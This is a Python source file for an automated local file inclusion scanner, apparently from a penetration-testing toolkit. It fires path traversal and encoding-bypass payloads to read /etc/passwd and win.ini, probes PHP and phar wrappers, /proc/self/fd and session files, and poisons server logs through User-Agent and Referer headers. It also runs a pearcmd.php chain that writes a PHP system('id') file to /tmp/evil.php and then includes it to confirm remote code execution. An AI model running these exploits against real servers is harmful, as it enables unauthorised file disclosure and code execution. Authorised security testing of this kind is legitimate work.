import os
import re
from typing import Dict, List, Optional

import requests

from tools.http_client import build_url
from tools.log_utils import get_logger
from tools.payload_engine import generate
from tools.settings import settings
from tools.verification_oracle import ConfidenceVoter

logger = get_logger("lfi_scanner")

LFI_RCE_PAYLOAD = "echo 'LFI_TEST_SUCCESS';"

EVIDENCE_PATTERNS = [
    (r"root:.*:0:0:", "/etc/passwd"),
    (r"\[fonts\]", "/windows/win.ini"),
    (r"\[extensions\]", "/windows/win.ini"),
    (r"\[mail\]", "/windows/win.ini"),
    (r"root:", "/etc/passwd"),
    (r"www-data|xfs|nobody|daemon|bin:", "/etc/passwd"),
    (r"uid=\d+\([\w]+\)", "cmd_exec"),
    (r"gid=\d+\([\w]+\)", "cmd_exec"),
]

PHAR_WRAPPER_PAYLOADS = [
    "phar://uploads/image.jpg",
    "phar://uploads/evil.zip",
    "phar://./uploads/image.gif",
    "php://filter/convert.base64-encode/resource=phar://uploads/evil.zip",
]

PEARCMD_PAYLOAD = "/usr/share/php/pearcmd.php?+config-create+/<?=system('id')?>+/tmp/evil.php"

ENCODING_BYPASS_PAYLOADS = [
    "%2e%2e%2fetc%2fpasswd",
    "%252e%252e%252fetc%252fpasswd",
    "..%c0%ae%c0%ae/etc/passwd",
    "..%c0%ae%c0%ae%c0%afetc/passwd",
    "..%252f..%252f..%252fetc/passwd",
    "....//....//....//etc/passwd",
    "..\\/..\\/..\\/etc/passwd",
]

SESSION_POISON_PATHS = [
    "/tmp/sess_%s",
    "/var/lib/php/sessions/sess_%s",
    "/var/lib/php/session/sess_%s",
    "/var/cpanel/php/sessions/sess_%s",
    "/var/www/html/tmp/sess_%s",
    "/tmp/session/sess_%s",
    "/var/lib/php7.4/sessions/sess_%s",
    "/var/lib/php8.0/sessions/sess_%s",
    "/var/lib/php8.1/sessions/sess_%s",
    "/var/lib/php8.2/sessions/sess_%s",
]

PROC_FD_PATHS = ["/proc/self/fd/%d" % i for i in range(0, 50)]


class LFIScanner:
    def __init__(self, sess: Optional[requests.Session] = None, timeout: float = 10.0,
                 waf_name: Optional[str] = None):
        self.sess = sess or requests.Session()
        self.sess.verify = settings.verify_ssl
        self.timeout = timeout
        self.waf_name = waf_name
        self.findings = []

    def check_traversal(self, url: str, param: str) -> List[Dict]:
        results = []
        seeds = generate("lfi", "traversal", "all", self.waf_name) + \
                generate("lfi", "encoded", "all", self.waf_name)
        for entry in seeds:
            payload = entry["payload"]
            try:
                r = self.sess.get(build_url(url, param, payload),
                                  timeout=self.timeout)
                for pat, label in EVIDENCE_PATTERNS:
                    if re.search(pat, r.text):
                        results.append({"payload": payload[:30], "label": label,
                                        "size": len(r.text), "status": r.status_code})
                        break
            except Exception as e:
                logger.debug("lfi traversal %s: %s", payload[:20], e)
        return results

    def check_php_wrappers(self, url: str, param: str) -> List[Dict]:
        results = []
        seeds = generate("lfi", "php_wrappers", "all", self.waf_name)
        for entry in seeds:
            payload = entry["payload"]
            wrapper_type = entry.get("type", "")
            indicator = entry.get("indicator", "")
            try:
                r = self.sess.get(build_url(url, param, payload),
                                  timeout=self.timeout)
                if wrapper_type == "base64":
                    if re.search(r'[A-Za-z0-9+/]{20,}={0,2}', r.text):
                        results.append({"payload": payload[:35], "type": "base64", "size": len(r.text)})
                elif wrapper_type == "rce":
                    if "uid=" in r.text or "LFI_TEST" in r.text or len(r.text) > 10:
                        results.append({"payload": payload[:35], "type": "rce_data", "size": len(r.text)})
                elif indicator and indicator in r.text:
                    results.append({"payload": payload[:35], "type": "disclosure", "size": len(r.text)})
            except Exception as e:
                logger.debug("lfi wrapper %s: %s", payload[:20], e)
        return results

    def check_log_poison(self, url: str, param: str) -> List[Dict]:
        results = []
        log_paths = [
            "/var/log/apache2/access.log",
            "/var/log/apache/access.log",
            "/var/log/nginx/access.log",
            "/var/log/httpd/access.log",
            "/var/log/apache2/error.log",
            "/var/log/apache/error.log",
            "/var/log/nginx/error.log",
        ]
        poison_payload = "<?php %s ?>" % LFI_RCE_PAYLOAD
        try:
            self.sess.get(build_url(url, param, poison_payload),
                          timeout=self.timeout)
        except Exception as e:
            logger.debug("lfi poison injection: %s", e)

        headers_poison = {"User-Agent": poison_payload, "Referer": poison_payload}
        try:
            self.sess.get(url, headers=headers_poison, timeout=self.timeout)
        except Exception as e:
            logger.debug("lfi header poison: %s", e)

        for log_path in log_paths:
            try:
                payload = "../../.." + log_path
                r = self.sess.get(build_url(url, param, payload),
                                  timeout=self.timeout)
                if "LFI_TEST_SUCCESS" in r.text:
                    results.append({"type": "log_poison_rce", "path": log_path,
                                    "status": r.status_code})
                elif "uid=" in r.text or "root:" in r.text:
                    results.append({"type": "log_poison", "path": log_path,
                                    "status": r.status_code})
            except Exception as e:
                logger.debug("lfi log poison %s: %s", log_path, e)
        return results

    def check_proc_fd_bruteforce(self, url: str, param: str) -> List[Dict]:
        results = []
        for fd_path in PROC_FD_PATHS:
            try:
                r = self.sess.get(build_url(url, param, fd_path),
                                  timeout=self.timeout)
                if len(r.text) > 50:
                    results.append({"fd": fd_path, "size": len(r.text),
                                    "status": r.status_code})
            except Exception as e:
                logger.debug("lfi fd %s: %s", fd_path, e)
        return results

    def check_session_poison(self, url: str, param: str, session_id: str = None) -> List[Dict]:
        results = []
        sid = session_id or "sess_" + os.urandom(8).hex()
        unique_paths = list(dict.fromkeys(SESSION_POISON_PATHS))
        for sess_path_tpl in unique_paths:
            try:
                payload = sess_path_tpl % sid
                r = self.sess.get(build_url(url, param, payload),
                                  timeout=self.timeout)
                if len(r.text) > 20:
                    results.append({"session_path": payload, "size": len(r.text)})
            except Exception as e:
                logger.debug("lfi session poison %s: %s", sess_path_tpl, e)
        return results

    def check_phar_wrappers(self, url: str, param: str) -> List[Dict]:
        results = []
        for payload in PHAR_WRAPPER_PAYLOADS:
            try:
                r = self.sess.get(build_url(url, param, payload),
                                  timeout=self.timeout)
                if "LFI_TEST_SUCCESS" in r.text or len(r.text) > 100:
                    results.append({"payload": payload[:35], "type": "phar_deserialization",
                                    "size": len(r.text)})
            except Exception as e:
                logger.debug("lfi phar %s: %s", payload[:20], e)
        return results

    def check_pearcmd(self, url: str, param: str) -> List[Dict]:
        results = []
        try:
            r = self.sess.get(build_url(url, param, PEARCMD_PAYLOAD),
                              timeout=self.timeout)
            if "uid=" in r.text or "LFI_TEST" in r.text or len(r.text) > 100:
                results.append({"payload": "pearcmd.php", "type": "pearcmd_rce",
                                "size": len(r.text)})
        except Exception as e:
            logger.debug("lfi pearcmd: %s", e)

        poc_payload = "/usr/share/php/pearcmd.php?+config-create+/<?=system('id')?>+/tmp/evil.php"
        try:
            self.sess.get(url, params={param: poc_payload}, timeout=self.timeout)
        except Exception:
            pass
        include_path = "/tmp/evil.php"
        try:
            r2 = self.sess.get(build_url(url, param, include_path), timeout=self.timeout)
            if "uid=" in r2.text:
                results.append({"payload": "pearcmd+rce", "type": "pearcmd_rce_chain",
                                "size": len(r2.text)})
        except Exception as e:
            logger.debug("lfi pearcmd include: %s", e)
        return results

    def check_encoding_bypass(self, url: str, param: str) -> List[Dict]:
        results = []
        for payload in ENCODING_BYPASS_PAYLOADS:
            try:
                r = self.sess.get(build_url(url, param, payload),
                                  timeout=self.timeout)
                for pat, label in EVIDENCE_PATTERNS:
                    if re.search(pat, r.text):
                        results.append({"payload": payload[:30], "label": label,
                                        "size": len(r.text), "status": r.status_code,
                                        "type": "encoding_bypass"})
                        break
            except Exception as e:
                logger.debug("lfi encoding %s: %s", payload[:20], e)
        return results

    def check(self, url: str, param: str) -> Dict:
        result = {"vulnerable": False, "rce_available": False, "findings": []}
        result["findings"].extend(self.check_traversal(url, param))
        result["findings"].extend(self.check_encoding_bypass(url, param))
        result["findings"].extend(self.check_php_wrappers(url, param))
        result["findings"].extend(self.check_phar_wrappers(url, param))
        result["findings"].extend(self.check_pearcmd(url, param))
        result["findings"].extend(self.check_log_poison(url, param))
        result["findings"].extend(self.check_proc_fd_bruteforce(url, param))
        result["findings"].extend(self.check_session_poison(url, param))

        voter = ConfidenceVoter()
        for f in result["findings"]:
            label = f.get("label", "") or f.get("type", "")
            ftype = f.get("type", "")
            if label == "/etc/passwd" or "root:" in str(f):
                voter.add_vote("etc_passwd", 0.85)
            elif label in ("cmd_exec",):
                voter.add_vote("cmd_exec", 0.75)
            elif ftype == "log_poison_rce":
                voter.add_vote("log_poison_rce", 0.9)
                result["rce_available"] = True
            elif ftype == "rce_data":
                voter.add_vote("wrapper_rce", 0.7)
                result["rce_available"] = True
            elif ftype == "phar_deserialization":
                voter.add_vote("phar_wrapper", 0.85)
                result["rce_available"] = True
            elif ftype == "pearcmd_rce" or ftype == "pearcmd_rce_chain":
                voter.add_vote("pearcmd_rce", 0.9)
                result["rce_available"] = True
            elif ftype == "encoding_bypass":
                voter.add_vote("encoding_bypass", 0.6)
            elif "rce" in ftype or f.get("label") == "cmd_exec":
                voter.add_vote("rce_other", 0.7)
                result["rce_available"] = True
            elif ftype == "base64":
                voter.add_vote("base64_wrapper", 0.5)
            elif label == "/windows/win.ini" or "[fonts]" in str(f):
                voter.add_vote("win_ini", 0.8)
            elif f.get("size", 0) > 200:
                voter.add_vote("large_response", 0.3)

        if result["findings"]:
            result["vulnerable"] = True
            voter.add_vote("has_findings", 0.3)

        result["confidence_score"] = round(voter.score, 2)
        result["confidence"] = voter.level.value
        result["confidence_votes"] = voter.evidence()
        return result

    def run(self, url: str, param: str) -> Dict:
        return self.check(url, param)


def check(url: str, param: str, sess: Optional[requests.Session] = None,
          timeout: float = 10.0, waf_name: Optional[str] = None) -> Dict:
    scanner = LFIScanner(sess, timeout, waf_name)
    return scanner.check(url, param)
